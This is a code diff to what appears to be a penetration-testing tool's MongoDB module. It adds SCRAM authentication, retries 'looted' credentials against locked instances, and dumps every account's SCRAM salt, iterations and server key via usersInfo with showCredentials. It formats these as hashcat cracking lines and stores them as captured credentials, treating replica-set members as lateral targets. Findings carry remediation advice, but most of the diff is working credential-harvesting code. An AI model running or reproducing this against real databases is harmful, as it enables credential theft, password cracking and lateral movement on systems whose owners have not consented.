@@ -48,6 +48,14 @@ def _e_str(name: str, v: str) -> bytes:
     return b"\x02" + _cstr(name) + struct.pack("<i", len(b)) + b
 
 
+def _e_bool(name: str, v: bool) -> bytes:
+    return b"\x08" + _cstr(name) + (b"\x01" if v else b"\x00")
+
+
+def _e_binary(name: str, v: bytes) -> bytes:
+    return b"\x05" + _cstr(name) + struct.pack("<i", len(v)) + b"\x00" + v
+
+
 def bson_doc(*elements: bytes) -> bytes:
     body = b"".join(elements)
     return struct.pack("<i", len(body) + 5) + body + b"\x00"
@@ -96,8 +104,8 @@ def bson_parse(data: bytes, i: int = 0, _depth: int = 0) -> tuple[dict, int]:
             blen = struct.unpack_from("<i", data, i)[0]
             if blen < 0:
                 break
+            out[name] = bytes(data[i + 5:i + 5 + blen])   # skip len(4) + subtype(1)
             i += 4 + 1 + blen
-            out[name] = None
         elif etype == 0x07:                            # ObjectId
             out[name] = data[i:i + 12].hex()
             i += 12
@@ -177,14 +185,111 @@ def _cmd(sock, name, rid, timeout, db="admin"):
     return command(sock, bson_doc(_e_int32(name, 1), _e_str("$db", db)), rid, timeout)
 
 
+def _scram_hashcat(username: str, mechanism: str, cred: dict) -> str:
+    """Format a MongoDB SCRAM credential (from usersInfo showCredentials) as a hashcat
+    line: mode 24100 for SCRAM-SHA-1 (`*0*`), mode 24200 for SCRAM-SHA-256 (`*1*`).
+    Layout: $mongodb-scram$*<0|1>*<b64 user>*<iterations>*<b64 salt>*<b64 serverKey>."""
+    import base64
+    if not isinstance(cred, dict):
+        return ""
+    it = cred.get("iterationCount")
+    salt = cred.get("salt")
+    server_key = cred.get("serverKey")
+    if not (it and salt and server_key):
+        return ""
+    mode = "1" if "256" in mechanism else "0"
+    ub = base64.b64encode(username.encode()).decode()
+    return f"$mongodb-scram$*{mode}*{ub}*{it}*{salt}*{server_key}"
+
+
+def _mongo_scram(sock, user: str, password: str, mechanism: str, rid: int,
+                 timeout: float) -> bool:
+    """One SCRAM conversation (saslStart -> saslContinue*) on `sock`. Returns True on a
+    completed, mutually-verified authentication. Never raises."""
+    from . import scram
+    try:
+        pw = scram.mongo_sha1_secret(user, password) if "SHA-1" in mechanism else password
+        client = scram.ScramClient(user, pw, mechanism)
+        first = client.first_message().encode()
+        r = command(sock, bson_doc(
+            _e_int32("saslStart", 1), _e_str("mechanism", mechanism),
+            _e_binary("payload", first), _e_int32("autoAuthorize", 1),
+            _e_str("$db", "admin")), rid, timeout)
+        if not isinstance(r, dict) or r.get("ok") != 1.0:
+            return False
+        conv = r.get("conversationId")
+        server_first = (r.get("payload") or b"")
+        final = client.final_message(server_first.decode("utf-8", "replace")).encode()
+        r2 = command(sock, bson_doc(
+            _e_int32("saslContinue", 1), _e_int32("conversationId", int(conv or 0)),
+            _e_binary("payload", final), _e_str("$db", "admin")), rid + 1, timeout)
+        if not isinstance(r2, dict) or r2.get("ok") != 1.0:
+            return False
+        client.verify((r2.get("payload") or b"").decode("utf-8", "replace"))
+        if r2.get("done"):
+            return True
+        r3 = command(sock, bson_doc(
+            _e_int32("saslContinue", 1), _e_int32("conversationId", int(conv or 0)),
+            _e_binary("payload", b""), _e_str("$db", "admin")), rid + 2, timeout)
+        return isinstance(r3, dict) and r3.get("ok") == 1.0 and bool(r3.get("done"))
+    except (ValueError, KeyError, struct.error):
+        return False
+
+
+def authenticate(ip: str, port: int = _DEFAULT_PORT, user: str = "", password: str = "",
+                 timeout: float = _TIMEOUT) -> bool:
+    """Try one credential against MongoDB (SCRAM-SHA-256 then SCRAM-SHA-1). No data is
+    read; the socket is dropped after the handshake completes."""
+    for mech in ("SCRAM-SHA-256", "SCRAM-SHA-1"):
+        try:
+            with socket.create_connection((ip, port), timeout=timeout) as s:
+                if _mongo_scram(s, user, password, mech, 20, timeout):
+                    return True
+        except OSError:
+            return False
+    return False
+
+
+def probe_creds(ip: str, port: int, user: str, password: str,
+                timeout: float = _TIMEOUT) -> dict:
+    """Credentialed probe: authenticate, then run the same deep enumeration as the
+    unauth path. Returns {reachable, cred_access, cred_user, version, databases, users,
+    hashes, ...} or {} if unreachable."""
+    out: dict = {"reachable": False, "cred_access": False, "cred_user": user}
+    try:
+        with socket.create_connection((ip, port), timeout=timeout) as s:
+            hello = _hello(s, 1, timeout)
+            if not isinstance(hello, dict) or "maxWireVersion" not in hello:
+                return {}
+            out["reachable"] = True
+            if not _mongo_scram(s, user, password, "SCRAM-SHA-256", 20, timeout) and \
+                    not _mongo_scram(s, user, password, "SCRAM-SHA-1", 30, timeout):
+                return out
+            out["cred_access"] = True
+            bi = _build_info(s, 40, timeout)
+            out["version"] = (bi or {}).get("version", "")
+            out["js_engine"] = (bi or {}).get("javascriptEngine", "")
+            ld = _list_databases(s, 41, timeout)
+            if isinstance(ld, dict) and isinstance(ld.get("databases"), list):
+                out["databases"] = [{"name": d.get("name", ""),
+                                     "size": d.get("sizeOnDisk", 0)}
+                                    for d in ld["databases"] if isinstance(d, dict)]
+            _deep_mongo(s, out, timeout)
+    except OSError:
+        return out
+    return out
+
+
 def _deep_mongo(sock, out: dict, timeout: float) -> None:
     """Read-only deep enumeration on an unauthenticated MongoDB: captured user accounts
     (+ credential mechanisms), replica-set members (lateral targets), and the on-disk
     config (whether auth is even configured). Populates out[users|replset|replset_members
     |auth_configured|bind_ip|js_engine]. Never raises."""
-    # usersInfo on admin: dump account names, roles and credential mechanisms (loot).
-    ui = _cmd(sock, "usersInfo", 10, timeout)
-    users = []
+    # usersInfo on admin with showCredentials: dump accounts, roles AND the SCRAM
+    # key material (salt/iterations/serverKey) -> crackable hashcat lines.
+    ui = command(sock, bson_doc(_e_int32("usersInfo", 1), _e_bool("showCredentials", True),
+                                _e_str("$db", "admin")), 10, timeout)
+    users, hashes = [], []
     if isinstance(ui, dict) and isinstance(ui.get("users"), list):
         for u in ui["users"]:
             if not isinstance(u, dict):
@@ -193,9 +298,16 @@ def _deep_mongo(sock, out: dict, timeout: float) -> None:
             mechs = list(creds.keys()) if isinstance(creds, dict) else []
             roles = [r.get("role", "") for r in u.get("roles", [])
                      if isinstance(r, dict)]
-            users.append({"user": u.get("user", ""), "db": u.get("db", ""),
+            uname = u.get("user", "")
+            users.append({"user": uname, "db": u.get("db", ""),
                           "roles": roles, "mechanisms": mechs})
+            if isinstance(creds, dict):
+                for mech, c in creds.items():
+                    hc = _scram_hashcat(uname, mech, c)
+                    if hc:
+                        hashes.append({"user": uname, "mechanism": mech, "hashcat": hc})
     out["users"] = users
+    out["hashes"] = hashes
     # replSetGetStatus: replica-set members are additional lateral targets.
     rs = _cmd(sock, "replSetGetStatus", 11, timeout)
     if isinstance(rs, dict) and rs.get("ok") == 1.0:
@@ -318,12 +430,15 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                 # Deeper: accounts, replica-set topology and config captured read-only.
                 extra = ""
                 users = pr.get("users") or []
+                hashes = pr.get("hashes") or []
                 if users:
                     named = ", ".join(u["user"] for u in users[:8] if u.get("user"))
                     extra += (f"\n\nCAPTURED {len(users)} user account(s) via usersInfo"
                               + (f": {named}" if named else "")
-                              + " (roles + credential mechanisms readable = crackable "
-                                "SCRAM material / privilege map).")
+                              + (f"; {len(hashes)} crackable SCRAM hash(es) extracted "
+                                 "(hashcat -m 24100/24200)" if hashes else
+                                 " (roles + credential mechanisms; privilege map)")
+                              + ".")
                 members = pr.get("replset_members") or []
                 if members:
                     extra += (f"\n\nReplica set '{pr.get('replset', '')}' - "
@@ -349,6 +464,28 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "Enable authentication (security.authorization: enabled), create "
                     "admin users, and bind the listener to a trusted interface only.",
                     ["CWE-306", "CWE-284"], kind="mongo_unauth"))
+            elif pr.get("cred_access"):
+                dbs = pr.get("databases") or []
+                who = pr.get("cred_user", "?")
+                users = pr.get("users") or []
+                hashes = pr.get("hashes") or []
+                extra = ""
+                if users:
+                    extra += (f" Enumerated {len(users)} account(s)"
+                              + (f"; {len(hashes)} SCRAM hash(es) extracted (hashcat "
+                                 "-m 24100/24200)" if hashes else "") + ".")
+                out.append(_finding(
+                    "high", "MongoDB credentialed access (looted / weak credential)", tgt,
+                    f"recce authenticated as '{who}' (SCRAM) with a credential from the "
+                    "engagement"
+                    + (f" (version {ver})" if ver else "")
+                    + f" and read {len(dbs)} database(s)." + extra,
+                    "mongosh",
+                    f"mongosh 'mongodb://{who}:<pass>@{h.ip}:{p.portid}/?authSource=admin' "
+                    "--eval 'db.adminCommand({usersInfo:1,showCredentials:true})'",
+                    "Rotate the credential; enforce least privilege / SCRAM-SHA-256; bind "
+                    "to a trusted interface.",
+                    ["CWE-522", "CWE-284"], kind="mongo_cred_access"))
             if ver and _old_version(ver):
                 out.append(_finding(
                     "medium", "MongoDB end-of-life / legacy build", tgt,
@@ -391,23 +528,43 @@ def analyze(hosts: list[Host], creds: dict | None = None, active: bool = True,
     """Full MongoDB analysis. Returns {targets, findings, runbooks, probes, stats}.
     `budget` caps wall-clock seconds; `progress(i, n, target)` fires per probe."""
     from . import svcprobe
+    from .models import Credential
+    from .postgres import _cred_list
     targets = mongodb_targets(hosts)
     probes: dict = {}
     state: dict = {}
+    looted: list = []
     if active:
         for t, pr in svcprobe.iter_probe(
                 targets, lambda t: probe(t["ip"], t["port"]),
                 budget=budget, progress=progress, state=state):
-            if pr:
-                probes[(t["ip"], t["port"])] = pr
-                t["unauth"] = pr.get("unauth", False)
-                t["version"] = pr.get("version", "")
-                t["databases"] = len(pr.get("databases") or [])
+            if not pr:
+                continue
+            # Credentialed follow-through: a reachable-but-locked instance is retried
+            # with each supplied/looted credential (SCRAM-SHA-256/1).
+            if not pr.get("unauth"):
+                for u, pw in _cred_list(creds):
+                    cp = probe_creds(t["ip"], t["port"], u, pw)
+                    if cp.get("cred_access"):
+                        pr = cp
+                        break
+            probes[(t["ip"], t["port"])] = pr
+            t["unauth"] = pr.get("unauth", False)
+            t["cred_access"] = pr.get("cred_access", False)
+            t["version"] = pr.get("version", "")
+            t["databases"] = len(pr.get("databases") or [])
+            for hh in pr.get("hashes", []):
+                looted.append(Credential(
+                    username=hh["user"], secret=hh["hashcat"], kind="hash",
+                    source="mongodb-loot", origin_ip=t["ip"],
+                    notes=f"MongoDB SCRAM {hh['mechanism']} (hashcat "
+                          f"{'24200' if '256' in hh['mechanism'] else '24100'}) :{t['port']}"))
     fs = findings(hosts, probes)
     runbooks = [{"target": f"{t['ip']}:{t['port']}", "ip": t["ip"],
                  "credfree": runbook(t["ip"], t["port"]), "credentialed": []}
                 for t in targets]
     return {"targets": targets, "findings": fs, "runbooks": runbooks,
+            "credentials": looted,
             "probes": {f"{k[0]}:{k[1]}": v for k, v in probes.items()},
             "stats": {"targets": len(targets), "findings": len(fs),
-                      "stopped": state.get("stopped")}}
+                      "credentials": len(looted), "stopped": state.get("stopped")}}
